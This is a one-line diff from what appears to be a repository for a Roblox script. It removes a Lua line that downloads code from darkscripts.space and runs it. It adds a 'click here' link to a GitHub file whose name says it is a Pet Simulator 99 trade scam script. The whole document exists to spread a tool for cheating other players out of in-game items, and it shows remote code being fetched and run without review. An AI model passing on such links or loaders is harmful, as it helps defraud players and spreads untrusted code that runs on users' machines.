@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://darkscripts.space/scripts/c2adcba2e2.lua',true))()
+YOU CAN GET THE SCRIPT ON [THE SCRIPT](https://github.com/JohnyPuPs/PS99-TRADE-SCAM-SCRIPT/blob/main/THE%20SCRIPT) <--CLICK HERE
